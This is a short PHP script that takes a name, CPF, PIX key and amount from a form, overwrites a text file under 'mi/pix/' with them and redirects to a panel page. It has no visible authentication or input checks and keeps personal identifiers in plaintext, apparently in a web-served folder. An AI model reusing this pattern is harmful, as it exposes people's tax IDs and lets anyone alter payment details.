<?php
$name = $_POST['name'] ?? '';
$cpf = $_POST['cpf'] ?? '';
$pixKey = $_POST['pixKey'] ?? '';
$valor = $_POST['valor'] ?? '';

// Formatar os dados
$data = "Nome: " . $name . "\n" .
         "CPF: " . $cpf . "\n" .
         "Chave PIX: " . $pixKey . "\n" .
         "Valor: " . $valor . "\n\n";

// Limpar o arquivo
$filename = "mi/pix/data.txt";
$file = fopen($filename, 'r+');
if ($file) {
    ftruncate($file, 0);
    fclose($file);
}

// Salvar os dados no arquivo de texto
file_put_contents($filename, $data);

// Redirecionar de volta para o painel
header("Location: painel.php");
exit();
?>